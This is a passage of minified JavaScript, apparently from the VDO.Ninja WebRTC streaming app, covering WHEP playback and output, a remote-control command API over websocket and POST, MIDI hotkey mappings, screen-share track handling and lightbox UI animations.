headers=xhttp.getAllResponseHeaders();var contentType=!1;if(headers.indexOf("content-type")>=0&&(contentType=this.getResponseHeader("content-type")),headers.indexOf("location")>=0&&(responseLocation=this.getResponseHeader("location")),headers.indexOf("accept-patch")>=0&&(acceptPatch=this.getResponseHeader("accept-patch")),headers.indexOf("etag")>=0&&(eTag=this.getResponseHeader("etag")),responseLocation&&!responseLocation.startsWith("http://")&&!responseLocation.startsWith("https://")){let requestURL=new URL(whepInput),protocol=requestURL.protocol,hostname=requestURL.hostname,port=requestURL.port||("https:"===protocol?"443":"80");responseLocation=`${protocol}//${hostname}:${port}${responseLocation}`}if(contentType&&contentType.startsWith("application/sdp")){var description={};if(description.sdp=this.responseText,description.type="answer",warnlog("Processing answer:"),(iceUfrag=description.sdp.match(/a=ice-ufrag:(.*)\r\n/))&&(iceUfrag=iceUfrag[1]),(icePwd=description.sdp.match(/a=ice-pwd:(.*)\r\n/))&&(icePwd=icePwd[1]),description.sdp=processSDPFromServer(description.sdp),session.rpcs[UUID].whep.setRemoteDescription(description).then((function(){warnlog("SHOULD BE CONNECTED?")})).catch((function(e){log(e)})),eTag&&icePwd&&iceUfrag&&acceptPatch&&"application/trickle-ice-sdpfrag"==acceptPatch&&candidates.length&&responseLocation&&!session.rpcs[UUID].whep.iceCompletedCallback){log("Send patch request with ice candidates");let patchCandidates="a=ice-ufrag:"+iceUfrag+"\r\na=ice-pwd:"+icePwd+"\r\nm=audio RTP/AVP 0\r\na=mid:0\r\n";candidates.forEach((candidate=>{patchCandidates+="a="+candidate.candidate+"\r\n"})),candidates=[],patchCandidates+="a=end-of-candidates\r\n",ajax(patchCandidates,"trickle-ice-sdpfrag",!1,{"if-match":eTag})}else warnlog("Trickling candidates via PATCH requests not supported it seems")}else"application/error"==contentType?session.cleanOutput||warnUser("Unknown WHEP playback error"):callback&&callback()}},"trickle-ice-sdpfrag"===type?responseLocation?xhttp.open("PATCH",responseLocation,!0):xhttp.open("PATCH",whepInput,!0):xhttp.open("POST",whepInput,!0),xhttp.setRequestHeader("Content-Type","application/"+type),whepInputToken&&xhttp.setRequestHeader("Authorization","Bearer "+whepInputToken),headers&&Object.keys(headers).forEach((key=>{xhttp.setRequestHeader(key,headers[key])})),xhttp.onerror=function(e){errorlog(e),session.cleanOutput||(whepInput.startsWith("https://")?"https:"!==location.protocol?warnUser("WHEP playback failed.\n\nThe website needs to be loaded via https (ssl) to access media devices."):"isSecureContext"in window&&!1===window.isSecureContext?warnUser("WHEP playback failed.\n\nThe website may have assets loaded in an insecure context."):warnUser("WHEP playback failed."):"https:"===location.protocol?warnUser("WHEP playback failed.\n\nThe WHEP URL needs to be using https if from an SSL-enabled websites."):"isSecureContext"in window&&!1===window.isSecureContext?warnUser("WHEP playback failed.\n\nThe website may have assets loaded in a secure context."):warnUser("WHEP playback failed."))},xhttp.send(dataPayload)}catch(e){errorlog(e)}}errorlog("no whepInput")}function whepOut(){if(session.whepHost){warnlog("WHEP Client started");var socket=null,connecting=!1,failedCount=0;!function connect(){if(clearTimeout(connecting),socket){if(socket.readyState===socket.OPEN)return;try{socket.close()}catch(e){}}log("Trying to load whep websocket..."),(socket=new WebSocket("wss://whep.vdo.ninja")).onclose=function(){failedCount+=1,clearTimeout(connecting),connecting=setTimeout((function(){connect()}),100*(failedCount-1))},socket.onerror=function(e){console.error(e),failedCount+=1,clearTimeout(connecting),connecting=setTimeout((function(){connect()}),100*failedCount)},socket.onopen=function(){failedCount=0;try{socket.send(JSON.stringify({join:session.whepHost}))}catch(e){connecting=setTimeout((function(){connect()}),1)}},socket.addEventListener("message",(async function(event){if(event.data){log(event.data);var data=JSON.parse(event.data);if("sdp"in data){var resp=await processWHEPout(data);if(resp){var ret={},get=data.get;data={},get&&(data.get=get,data.result=resp,ret.callback=data,log(ret),socket.send(JSON.stringify(ret)))}}else if("delete"==data.type){warnlog("WHIP Client is actively disconnecting");ret={},get=data.get;data={},get&&(data.get=get,data.result="OK",ret.callback=data,log(ret),socket.send(JSON.stringify(ret)))}}}))}()}}async function processWHEPout(data){var description={type:"offer"},isGstreamer=!1;description.sdp=data.sdp.replace(/a=rtpmap:111 OPUS\/48000\r\n/g,"a=rtpmap:111 opus/48000/2\r\n"),description.sdp!==data.sdp&&(isGstreamer=!0);var UUID=session.generateRandomString(25)+"_whepout";UUID in session.pcs&&(UUID=session.generateRandomString(25)+"_whepout");try{session.configuration||await chooseBestTURN(),session.encodedInsertableStreams&&(session.configuration.encodedInsertableStreams=!0);var config={...session.configuration};session.pcs[UUID]=new RTCPeerConnection(config),session.pcs[UUID].onicecandidate=event=>{event.candidate};try{await session.pcs[UUID].setRemoteDescription(description)}catch(e){errorlog(e),errorlog("If you are seeing this error, the browser likely isn't able to match what you are requesting. Compare a normal browser-create SDP with what you are offering.")}session.pcs[UUID].getTransceivers().forEach((transceiver=>{const direction=transceiver.currentDirection||transceiver.direction;"sendrecv"!==direction&&"sendonly"!==direction&&(transceiver.direction="sendonly",session.videoElement.srcObject.getAudioTracks().forEach((track=>{if(transceiver.direction.includes("send")){if(transceiver.sender.track&&"audio"!=transceiver.sender.track.kind)return;if(transceiver.receiver.track&&"audio"!=transceiver.receiver.track.kind)return;transceiver.sender.replaceTrack(track).then((()=>{log(`Added track: ${track.kind}`)})).catch(errorlog)}})),session.videoElement.srcObject.getVideoTracks().forEach((track=>{if(transceiver.direction.includes("send")){if(transceiver.sender.track&&"video"!=transceiver.sender.track.kind)return;if(transceiver.receiver.track&&"video"!=transceiver.receiver.track.kind)return;transceiver.sender.replaceTrack(track).then((()=>{log(`Added track: ${track.kind}`)})).catch(errorlog)}})))}));const localDescription=await session.pcs[UUID].createAnswer();return await session.pcs[UUID].setLocalDescription(localDescription),await sleep(session.whepWait),isGstreamer?session.pcs[UUID].localDescription.sdp.replace("a=rtpmap:111 opus/48000/2\r\n","a=rtpmap:111 OPUS/48000\r\n"):session.pcs[UUID].localDescription.sdp}catch(error){console.error("Error setting up the peer connection:",error)}}function pokePostAPI(action,data,streamID){var msg={update:{}};msg.update.streamID=streamID||session.streamID||null,msg.update.action=action,msg.update.value=data;try{var xhttp=new XMLHttpRequest;xhttp.onreadystatechange=function(){4!=this.readyState||200!=this.status&&201!=this.status?warnlog("post api didn't work?"):log("good")},xhttp.open("POST",session.postApi,!0),xhttp.setRequestHeader("Content-type","application/json"),xhttp.onerror=function(e){errorlog(e)},xhttp.send(JSON.stringify(msg))}catch(e){errorlog(e)}}var queuedSendingAPIMsgs=[];function pokeAPI(action,data,streamID=null){if(session.postApi&&pokePostAPI(action,data,streamID),session.api)if(session.apiSocket)try{var msg={update:{}};msg.update.streamID=streamID||session.streamID||null,msg.update.action=action,msg.update.value=data,session.apiSocket.send(JSON.stringify(msg))}catch(e){errorlog(e)}else null!==session.apiSocket&&(queuedSendingAPIMsgs.push([action,data,streamID]),queuedSendingAPIMsgs.length>20&&queuedSendingAPIMsgs.shift())}function oscClient(){if(session.api){warnlog("oscClient started");var socket=null,connecting=!1,failedCount=0;!function connect(){if(clearTimeout(connecting),socket){if(socket.readyState===socket.OPEN)return;try{socket.close()}catch(e){}}(socket=new WebSocket(session.apiserver)).onclose=function(){session.apiSocket=!1,failedCount+=1,clearTimeout(connecting),connecting=setTimeout((function(){connect()}),100*(failedCount-1))},socket.onerror=function(){failedCount+=1,clearTimeout(connecting),connecting=setTimeout((function(){connect()}),100*failedCount)},socket.onopen=function(){failedCount=0;try{socket.send(JSON.stringify({join:session.api})),session.apiSocket=socket,queuedSendingAPIMsgs.length&&(queuedSendingAPIMsgs.forEach((msg=>{pokeAPI(msg[0],msg[1],msg[2])})),queuedSendingAPIMsgs=[]),pokeAPI("details",getDetailedState(session.streamID))}catch(e){connecting=setTimeout((function(){connect()}),1)}},socket.addEventListener("message",(async function(event){if(event.data){var data=JSON.parse(event.data);if("msg"in data&&(data=data.msg),"value"in data&&"action"in data&&"layout"==data.action)try{data.value=JSON.parse(data.value)||data.value}catch(e){}var resp=processMessage(data);if(null!==resp){var ret={};data.result=resp,ret.callback=data,log(ret),socket.send(JSON.stringify(ret))}}}))}()}}function setupCommands(){var commands={raisehand:function(value=null,value2=null){return raisehand()},togglehand:function(value=null,value2=null){return raisehand()},togglescreenshare:function(value=null,value2=null){return toggleScreenShare(),session.screenShareState},chat:function(value=null,value2=null){return toggleChat(value),session.chat},speaker:function(value=null,value2=null){return!0===value?(session.speakerMuted=!1,toggleSpeakerMute(!0)):!1===value?(session.speakerMuted=!0,toggleSpeakerMute(!0)):"toggle"===value&&toggleSpeakerMute(),session.speakerMuted},mic:function(value=null,value2=null){return!0===value?(session.muted=!1,log(session.muted),toggleMute(!0)):!1===value?(session.muted=!0,log(session.muted),toggleMute(!0)):"toggle"===value&&toggleMute(),session.muted},camera:function(value=null,value2=null){return!0===value?(session.videoMuted=!1,log(session.videoMuted),toggleVideoMute(!0)):!1===value?(session.videoMuted=!0,log(session.videoMuted),toggleVideoMute(!0)):"toggle"===value&&toggleVideoMute(),session.videoMuted},hangup:function(value=null,value2=null){return hangup(),!0},bitrate:function(value=null,value2=null){for(var i in value=!1===value?0:!0===value?-1:parseInt(value)||0,session.rpcs)try{session.requestRateLimit(value,i)}catch(e){errorlog(e)}return value},getDetails:function(value=null,value2=null){return getDetailedState()},getStats:function(value=null,value2=null){return getQuickStats(value)},getGuestList:function(value=null,value2=null){return getGuestList()},reload:function(value=null,value2=null){return reloadRequested(),!0},volume:function(value=null,value2=null){for(var i in value=!1===value?0:!0===value?100:parseInt(value)||0,value=parseFloat(value/100),session.rpcs)try{session.rpcs[i].videoElement.volume=parseFloat(value)}catch(e){errorlog(e)}return value},forceKeyframe:function(value=null,value2=null){return session.forcePLI()},panning:function(value=null,value2=null){for(var uuid in value=!1===value||!0===value?90:parseInt(value),session.rpcs)try{adjustPan(uuid,value)}catch(e){errorlog(e)}return value},record:function(value=null,value2=null){if(session.videoElement)return!1===value?"recording"in session.videoElement&&recordLocalVideo("stop"):!0===value&&("recording"in session.videoElement||recordLocalVideo("start")),value},group:function(value=null,value2=null){return!(!value||"null"===value)&&changeGroupDirectorAPI(value)},joinGroup:function(value=null,value2=null){return!(!value||"null"===value)&&changeGroupDirectorAPI(value,!0)},leaveGroup:function(value=null,value2=null){return!(!value||"null"===value)&&changeGroupDirectorAPI(value,!1)},viewGroup:function(value=null,value2=null){return!(!value||"null"===value)&&changeGroupViewDirectorAPI(value)},joinViewGroup:function(value=null,value2=null){return!(!value||"null"===value)&&changeGroupViewDirectorAPI(value,!0)},leaveViewGroup:function(value=null,value2=null){return!(!value||"null"===value)&&changeGroupViewDirectorAPI(value,!1)},sendChat:function(value=null,value2=null){return sendChat(value),!0},startRoomTimer:function(value=null,value2=null){return getById("globalTimerDirectorToggle").value=0,directRoomTimer(getById("globalTimerDirectorToggle"),!1,value),!0},pauseRoomTimer:function(value=null,value2=null){return getById("globalTimerDirectorToggle").value,directRoomTimer(getById("globalTimerDirectorToggle"),{ctrlKey:!0},value),!0},stopRoomTimer:function(value=null,value2=null){return getById("globalTimerDirectorToggle").value=1,directRoomTimer(getById("globalTimerDirectorToggle"),!1,value),!0},tallylight:function(value=null,value2=null){return session.tallyOverride="onair"==value?1:"active"==value?2:"standby"==value?3:"false"!=value&&("off"!=value&&(value&&parseInt(value)||0)),applySceneState(),!0},prevSlide:function(value=null,value2=null){var data={d:[176,110,10]};return playbackMIDI(data),!0},nextSlide:(function(value=null,value2=null){var data={d:[176,110,11]};return playbackMIDI(data),!0},function(value=null,value2=null){var data={d:[176,110,11]};return playbackMIDI(data),!0}),soloVideo:function(value=null,value2=null){var element=getById("highlightDirector");return value&&"toggle"==value?requestInfocus(element):value&&"null"!==value?requestInfocus(element,null,!0):value&&"null"===value?requestInfocus(element):requestInfocus(element,null,!1)},highlight:function(value=null,value2=null){return commands.soloVideo(value,value2)},layout:function(value=null,value2=null){try{if(parseInt(value)==value)0==(value=parseInt(value))?value=!1:value-=1;else if("object"==typeof value){if(session.layout=value,pokeIframeAPI("layout-updated",session.layout),session.director){for(var combined={},i=0;i<session.layout.length;i++){if(session.layout[i])if("slot"in session.layout[i])if(slot=document.querySelector("div.slotsbar[data-slot='"+(parseInt(session.layout[i].slot)+1)+"']"))combined[slot.dataset.sid]=session.layout[i]}issueLayout(combined,"0")}return updateMixer(),!0}if(null===value)return session.layout=!1,pokeIframeAPI("layout-updated",session.layout),pokeIframeAPI("layout-index",0),session.director&&issueLayout(!1,"0"),updateMixer(),!0;if(!1===value)return session.layout=!1,pokeIframeAPI("layout-updated",session.layout),pokeIframeAPI("layout-index",0),session.director&&issueLayout(!1,"0"),updateMixer(),!0;if(session.layouts&&session.layouts[value]){try{if(console.log(session.layouts),session.layout=session.layouts[value],pokeIframeAPI("layout-updated",session.layout),pokeIframeAPI("layout-index",value+1),session.director){for(combined={},i=0;i<session.layout.length;i++){var slot;if(session.layout[i])if("slot"in session.layout[i])if(slot=document.querySelector("div.slotsbar[data-slot='"+(parseInt(session.layout[i].slot)+1)+"']")||!1)combined[slot.dataset.sid]=session.layout[i];else console.error("Slot target not found?")}session.layout=combined,console.log("issuing layout:"),console.log(session.layout),issueLayout(session.layout,"0")}}catch(e){console.error(e)}return updateMixer(),!0}return console.error("no layout found"),console.log(session.layouts),!1}catch(e){errorlog(e)}}};return commands}var Commands=setupCommands();function processMessage(data){try{if(warnlog(data),"target"in data&&"null"!==data.target&&null!==data.target){if("action"in data)return targetGuest(data.target,data.action,"value"in data?data.value:null)}else if("action"in data&&data.action in Commands)return"value"in data?("true"==data.value?data.value=!0:"false"==data.value&&(data.value=!1),Commands[data.action](data.value)):Commands[data.action]()}catch(e){errorlog(e)}return null}function midiHotkeysNote(note,velocity=!1){if(1==session.midiHotkeys){if("G3"==note)return toggleChat(),session.chat;if("A3"==note)return toggleMute(),session.muted;if("B3"==note)return toggleVideoMute(),session.videoMuted;if("C4"==note)return toggleScreenShare(),session.screenShareState;if("D4"==note)return hangup(),!0;if("E4"==note)return raisehand(),raisehand();if("F4"==note)return recordLocalVideoToggle();if("G4"==note)return press2talk(!0),!0;if("A4"==note)return hangup2(),!0;if("B4"==note)return toggleSpeakerMute(),session.speakerMuted}else 2==session.midiHotkeys?"G1"==note?toggleChat():"A1"==note?toggleMute():"B1"==note?toggleVideoMute():"C2"==note?toggleScreenShare():"D2"==note?hangup():"E2"==note?raisehand():"F2"==note?recordLocalVideoToggle():"G2"==note?press2talk(!0):"A2"==note?hangup2():"B2"==note&&toggleSpeakerMute():3==session.midiHotkeys&&"C1"==note&&("0"==velocity?toggleChat():"1"==velocity?toggleMute():"2"==velocity?toggleVideoMute():"3"==velocity?toggleScreenShare():"4"==velocity?hangup():"5"==velocity?raisehand():"6"==velocity?recordLocalVideoToggle():"7"==velocity?press2talk(!0):"8"==velocity?hangup2():"9"==velocity&&toggleSpeakerMute())}function getRightOrderedElement(selector,guestslot,UUID=!1){var elements=getById("guestFeeds").children;if(!UUID)for(var i=0;i<elements.length;i++)try{UUID=elements[i].UUID;var lock=parseInt(document.getElementById("position_"+UUID).dataset.locked);if(lock&&lock==guestslot+1)return elements[i].querySelector(selector)||!1}catch(e){}return elements[guestslot]&&elements[guestslot].querySelector(selector)||!1}function midiHotkeysCommand_offset(command,value,offset=1){for(var i=0;i<9;i++)if(command==offset+i){var ele=getRightOrderedElement('[data-action-type="mute-guest"][data--u-u-i-d]',command-offset);ele&&remoteMute(ele,!0)}}function midiHotkeysCommand(command,value){if(110==command)0==value?toggleChat():1==value?toggleMute():2==value?toggleVideoMute():3==value?toggleScreenShare():4==value?hangup():5==value?raisehand():6==value?recordLocalVideoToggle():7==value?press2talk(!0):8==value&&hangup2();else if(command>110){var guestslot=command-111;if(0==value)(ele=getRightOrderedElement('[data-action-type="forward"][data--u-u-i-d]',guestslot))&&directMigrate(ele,!0);else if(1==value){(ele=getRightOrderedElement('[data-action-type="addToScene"][data-scene="1"][data--u-u-i-d]',guestslot))&&directEnable(ele,!0)}else if(2==value){(ele=getRightOrderedElement('[data-action-type="mute-scene"][data--u-u-i-d]',guestslot))&&directMute(ele,!0)}else if(3==value){(ele=getRightOrderedElement('[data-action-type="mute-guest"][data--u-u-i-d]',guestslot))&&remoteMute(ele,!0)}else if(4==value){(ele=getRightOrderedElement('[data-action-type="hangup"][data--u-u-i-d]',guestslot))&&directHangup(ele,!0)}else if(5==value){(ele=getRightOrderedElement('[data-action-type="solo-chat"][data--u-u-i-d]',guestslot))&&session.toggleSoloChat(ele.dataset.UUID)}else if(6==value){(ele=getRightOrderedElement('[data-action-type="toggle-remote-speaker"][data--u-u-i-d]',guestslot))&&remoteSpeakerMute(ele)}else if(7==value){(ele=getRightOrderedElement('[data-action-type="toggle-remote-display"][data--u-u-i-d]',guestslot))&&remoteDisplayMute(ele)}else if(8==value){(ele=getRightOrderedElement('[data-action-type="force-keyframe"][data--u-u-i-d]',guestslot))&&requestKeyframeScene(ele)}else if(12==value){(ele=getRightOrderedElement('[data-action-type="addToScene"][data-scene="2"][data--u-u-i-d]',guestslot))&&directEnable(ele,!0)}else if(13==value){(ele=getRightOrderedElement('[data-action-type="addToScene"][data-scene="3"][data--u-u-i-d]',guestslot))&&directEnable(ele,!0)}else if(14==value){(ele=getRightOrderedElement('[data-action-type="addToScene"][data-scene="4"][data--u-u-i-d]',guestslot))&&directEnable(ele,!0)}else if(15==value){(ele=getRightOrderedElement('[data-action-type="addToScene"][data-scene="5"][data--u-u-i-d]',guestslot))&&directEnable(ele,!0)}else if(16==value){(ele=getRightOrderedElement('[data-action-type="addToScene"][data-scene="6"][data--u-u-i-d]',guestslot))&&directEnable(ele,!0)}else if(17==value){(ele=getRightOrderedElement('[data-action-type="addToScene"][data-scene="7"][data--u-u-i-d]',guestslot))&&directEnable(ele,!0)}else if(18==value){(ele=getRightOrderedElement('[data-action-type="addToScene"][data-scene="8"][data--u-u-i-d]',guestslot))&&directEnable(ele,!0)}else if(value=>27){var ele;(ele=getRightOrderedElement('[data-action-type="volume"][data--u-u-i-d]',guestslot))&&(ele.value=parseInt(value-27),remoteVolume(ele))}}}function sendRawMIDI(input,UUID=!1,streamID=!1){var msg={midi:{}};if(msg.midi.d=input.data,msg.midi.s="timestamp"in input?input.timestamp:Date.now(),input.message&&input.message.channel?msg.midi.c=input.message.channel:input&&input.channel&&(msg.midi.c=input.channel),UUID&&session.pcs[UUID]&&session.pcs[UUID].allowMIDI)session.sendMessage(msg,UUID);else if(UUID&&session.rpcs[UUID]&&session.rpcs[UUID].allowMIDI)session.sendRequest(msg,UUID);else if(streamID){for(var UID in session.rpcs)if(session.rpcs[UID].allowMIDI&&session.rpcs[UID].streamID===streamID)return void session.sendRequest(msg,UID)}else{var list=[];for(var UID in session.pcs)session.pcs[UID].allowMIDI&&session.sendMessage(msg,UID)&&list.push(UID);for(var UID in session.rpcs)session.rpcs[UID].allowMIDI&&(list.includes(UID)||session.sendRequest(msg,UID))}}function playOutMidi(msg){if(console.log("Playing out remotely sourced MIDI"),!0===session.midiIn){if("d"in msg)for(var i in WebMidi.outputs)try{"c"in msg?WebMidi.outputs[i].channels[msg.c].send(msg.d):WebMidi.outputs[i].send(msg.d)}catch(e){errorlog(e)}}else if(session.midiIn==parseInt(session.midiIn))try{i=parseInt(session.midiIn)-1;"d"in msg&&("c"in msg?WebMidi.outputs[i].channels[msg.c].send(msg.d):WebMidi.outputs[i].send(msg.d))}catch(e){errorlog(e)}}function playbackMIDI(msg,unsafe=!1){if(!(!1===session.midiIn&&!1===session.midiRemote||session.midiOut===session.midiIn&&!1===session.midiRemote)){if(session.midiDelay&&"t"in msg){var timeDelay=session.midiDelay-(Date.now()-msg.t);timeDelay<=0?playOutMidi(msg):setTimeout((function(msg){playOutMidi(msg)}),timeDelay,msg)}else playOutMidi(msg);unsafe||(4==session.midiRemote?176==msg.d[0]&&midiHotkeysCommand(msg.d[1],msg.d[2]):1!=session.midiRemote&&2!=session.midiRemote&&3!=session.midiRemote||156==msg.d[0]&&(33==msg.d[1]?midiHotkeysNote("A1",msg.d[2]):55==msg.d[1]?midiHotkeysNote("G3",msg.d[2]):57==msg.d[1]?midiHotkeysNote("A3",msg.d[2]):59==msg.d[1]?midiHotkeysNote("B3",msg.d[2]):60==msg.d[1]?midiHotkeysNote("C4",msg.d[2]):62==msg.d[1]?midiHotkeysNote("D4",msg.d[2]):64==msg.d[1]?midiHotkeysNote("E4",msg.d[2]):65==msg.d[1]?midiHotkeysNote("F4",msg.d[2]):67==msg.d[1]?midiHotkeysNote("G4",msg.d[2]):69==msg.d[1]?midiHotkeysNote("A4",msg.d[2]):43==msg.d[1]?midiHotkeysNote("G2",msg.d[2]):35==msg.d[1]?midiHotkeysNote("B1",msg.d[2]):36==msg.d[1]?midiHotkeysNote("C2",msg.d[2]):38==msg.d[1]?midiHotkeysNote("D2",msg.d[2]):40==msg.d[1]?midiHotkeysNote("E2",msg.d[2]):41==msg.d[1]?midiHotkeysNote("F2",msg.d[2]):24==msg.d[1]&&midiHotkeysNote("C1",msg.d[2])))}}function addEventToAll(targets,trigger,callback){const target=document.querySelectorAll(targets);var triggers=trigger.split(" ");for(let i=0;i<target.length;i++)for(let j=0;j<triggers.length;j++)setTimeout((function(t1,t2){t1.addEventListener(t2,(function(e){callback(e,t1)}))}),0,target[i],triggers[j])}function insertAfter(newNode,existingNode){existingNode.parentNode.insertBefore(newNode,existingNode.nextSibling)}function getSenders2(UUID){var fixedSenders=[],isAlt=!1;if(!(UUID in session.pcs))return fixedSenders;if("realUUID"in session.pcs[UUID]&&(isAlt=!0,!((UUID=session.pcs[UUID].realUUID)in session.pcs)))return fixedSenders;var senders=session.pcs[UUID].getSenders();return isAlt?senders.forEach((sender=>{sender.track&&sender.track.id&&sender.track.id in screenshareTracks&&fixedSenders.push(sender)})):senders.forEach((sender=>{sender.track&&sender.track.id&&(sender.track.id in screenshareTracks||fixedSenders.push(sender))})),fixedSenders}function getReceivers2(UUID){var fixedReceivers=[],isAlt=!1,ssTracks=[];if("realUUID"in session.rpcs[UUID]){if(isAlt=!0,UUID=session.rpcs[UUID].realUUID,!("screenIndexes"in session.rpcs[UUID]))return void errorlog("this is supposed to be a screen share, but no screen share index was found");ssTracks=session.rpcs[UUID].screenIndexes}else"screenIndexes"in session.rpcs[UUID]&&session.rpcs[UUID].screenIndexes&&(ssTracks=session.rpcs[UUID].screenIndexes);if(session.rpcs[UUID].getReceivers)var receivers=session.rpcs[UUID].getReceivers();else receivers=[];try{if(session.rpcs[UUID].whep&&session.rpcs[UUID].whep.getReceivers)try{receivers=receivers.concat(session.rpcs[UUID].whep.getReceivers())}catch(e){errorlog(e)}}catch(e){errorlog(e)}if(isAlt){for(var i=0;i<receivers.length;i++)for(var j=0;j<ssTracks.length;j++)if(i==ssTracks[j]){fixedReceivers.push(receivers[i]);break}}else for(i=0;i<receivers.length;i++){var matched=!1;for(j=0;j<ssTracks.length;j++)i==ssTracks[j]&&(matched=!0);matched||fixedReceivers.push(receivers[i])}return fixedReceivers}function getReceiversMC(UUID){var fixedReceivers=[],isAlt=!1,ssTracks=[];if("realUUID"in session.rpcs[UUID]){if(isAlt=!0,UUID=session.rpcs[UUID].realUUID,!("screenIndexes"in session.rpcs[UUID]))return void errorlog("this is supposed to be a screen share, but no screen share index was found");ssTracks=session.rpcs[UUID].screenIndexes}else"screenIndexes"in session.rpcs[UUID]&&session.rpcs[UUID].screenIndexes&&(ssTracks=session.rpcs[UUID].screenIndexes);if(receivers=[],session.rpcs[UUID].whep&&(receivers=session.rpcs[UUID].whep.getReceivers()),isAlt){for(var i=0;i<receivers.length;i++)for(var j=0;j<ssTracks.length;j++)if(i==ssTracks[j]){fixedReceivers.push(receivers[i]);break}}else for(i=0;i<receivers.length;i++){var matched=!1;for(j=0;j<ssTracks.length;j++)i==ssTracks[j]&&(matched=!0);matched||fixedReceivers.push(receivers[i])}return fixedReceivers}async function createSecondStream2(UUID){if(!1===session.pcs[UUID].allowScreenVideo&&!1===session.pcs[UUID].allowScreenAudio)return!1;if("realUUID"in session.pcs[UUID])return!1;if(!session.screenStream)return!1;UUID+"_screen"in session.pcs||(warnlog(UUID+"_screen; new screen link"),session.pcs[UUID+"_screen"]={},session.pcs[UUID+"_screen"].realUUID=UUID,session.pcs[UUID+"_screen"].stats={},session.pcs[UUID+"_screen"].sceneDisplay=null,session.pcs[UUID+"_screen"].sceneMute=null,session.pcs[UUID+"_screen"].solo=null,session.pcs[UUID+"_screen"].allowVideo=session.pcs[UUID].allowScreenVideo,session.pcs[UUID+"_screen"].allowAudio=session.pcs[UUID].allowScreenAudio,session.pcs[UUID+"_screen"].layout=null,session.pcs[UUID+"_screen"].obsState={},session.pcs[UUID+"_screen"].obsState.visibility=null,session.pcs[UUID+"_screen"].obsState.sourceActive=null,session.pcs[UUID+"_screen"].obsState.streaming=null,session.pcs[UUID+"_screen"].obsState.recording=null,session.pcs[UUID+"_screen"].obsState.virtualcam=null,session.pcs[UUID+"_screen"].optimizedBitrate=!1,session.pcs[UUID+"_screen"].savedBitrate=!1,session.pcs[UUID+"_screen"].bitrateTimeout=null,session.pcs[UUID+"_screen"].bitrateTimeoutFirefox=!1,session.pcs[UUID+"_screen"].setAudioBitrate=!1,session.pcs[UUID+"_screen"].setBitrate=!1,session.pcs[UUID+"_screen"].maxBandwidth=null,session.pcs[UUID+"_screen"].limitAudio=!1,session.pcs[UUID+"_screen"].audioMutedOverride=!1,session.pcs[UUID+"_screen"].enhanceAudio=!1,session.pcs[UUID+"_screen"].meshcast=null,session.pcs[UUID+"_screen"].UUID=UUID+"_screen",session.pcs[UUID+"_screen"].scale=!1,session.pcs[UUID+"_screen"].scaleDueToBitrate=!1,session.pcs[UUID+"_screen"].scaleWidth=!1,session.pcs[UUID+"_screen"].scaleHeight=!1,session.pcs[UUID+"_screen"].scaleSnap=!1,session.pcs[UUID+"_screen"].scaleResolution=!1,session.pcs[UUID+"_screen"].scene=!1,session.pcs[UUID+"_screen"].keyframeRate=!1,session.pcs[UUID+"_screen"].keyframeTimeout=null,session.pcs[UUID+"_screen"].label=!1,session.pcs[UUID+"_screen"].order=!1,session.pcs[UUID+"_screen"].preferVideoCodec=!1,session.pcs[UUID+"_screen"].startTime=Date.now(),session.pcs[UUID+"_screen"].needsPublishing=null,session.pcs[UUID+"_screen"].getStats=function(){return new Promise(((resolve,reject)=>{resolve([])}))});for(var senders=getSenders2(UUID+"_screen"),tracks=session.screenStream.getTracks(),i=0;i<tracks.length;i++){var track=tracks[i];try{if("audio"===track.kind&&!1===session.pcs[UUID+"_screen"].allowAudio)continue;if("video"===track.kind&&!1===session.pcs[UUID+"_screen"].allowVideo)continue}catch(e){errorlog(e)}if(session.audioContentHint&&"audio"===track.kind)try{track.contentHint=session.audioContentHint}catch(e){errorlog(e)}if(session.screenshareContentHint&&"video"===track.kind)try{track.contentHint=session.screenshareContentHint}catch(e){errorlog(e)}else if(session.contentHint&&"video"===track.kind)try{track.contentHint=session.contentHint}catch(e){errorlog(e)}for(var added=!1,j=0;j<senders.length;j++){var sender=senders[j];if(sender.track&&sender.track.kind==track.kind){sender.replaceTrack(track),sender.track.enabled=!0,added=!0;break}}added||session.pcs[UUID].addTrack(track,session.screenStream)}session.applyIsolatedChat(),updateMixer()}addEventToAll(".column","click",(function(e,ele){if(ele.classList.contains("skip-animation"))return;try{var bounding_box=ele.getBoundingClientRect()}catch(e){return}ele.style.top=bounding_box.top+"px",ele.style.left=bounding_box.left-20+"px",ele.classList.add("in-animation"),ele.classList.remove("pointer"),ele.classList.remove("rounded"),document.getElementById("empty-container")&&getById("empty-container").parentNode.removeChild(getById("empty-container"));var empty=document.createElement("DIV");empty.id="empty-container",empty.className="column",ele.parentNode.insertBefore(empty,ele.nextSibling);const styles="\t\t@keyframes outlightbox {\t\t\t0% {\t\t\t\theight: 100%;\t\t\t\twidth: 100%;\t\t\t\ttop: 0px;\t\t\t\tleft: 0px;\t\t\t}\t\t\t50% {\t\t\t\theight: 200px;\t\t\t\ttop: "+bounding_box.y+"px;\t\t\t}\t\t\t100% {\t\t\t\theight: 200px;\t\t\t\twidth: "+bounding_box.width+"px;\t\t\t\ttop: "+bounding_box.y+"px;\t\t\t\tleft: "+bounding_box.x+"px;\t\t\t}\t\t}\t";document.getElementById("lightbox-animations")&&(getById("lightbox-animations").innerHTML=styles),document.body.style.overflow="hidden"})),addEventToAll(".close","click",(function(e,ele){cleanupMediaTracks(),document.querySelectorAll(".hidden2").forEach((ele2=>{ele2.classList.remove("hidden2")})),ele.style.display="none",mapToAll(".container-inner",(function(target){target.style.display="none"})),document.body.style.overflow="auto";var bounding_box=getById("empty-container").parentNode.getBoundingClientRect();setTimeout((function(){ele.parentNode.classList.add("out-animation")}),1),ele.parentNode.style.top=bounding_box.top+"px",ele.parentNode.style.left=bounding_box.left+"px",e.stopPropagation()})),addEventToAll(".column","animationend",(function(e,ele){"inlightbox"==e.animationName?(ele.classList.add("skip-animation"),mapToAll(".close",(function(target){target.style.display="block"}),ele),document.querySelectorAll("#header, #miniTaskBarm, #credits, .columnfade").forEach((ele2=>{ele2!==ele&&ele2.classList.add("hidden2")})),mapToAll(".container-inner",(function(target){target.style.display="block"}),ele)):"outlightbox"==e.animationName&&(ele.classList.remove("in-animation"),ele.classList.remove("out-animation"),ele.classList.remove("skip-animation"),ele.classList.remove("columnfade"),ele.classList.add("pointer"),ele.classList.add("rounded"),getById("empty-container").parentNode.removeChild(getById("empty-container")),getById("lightbox-animations").sheet.deleteRule(0))})),addEventToAll("#audioSource","mousedown touchend focusin 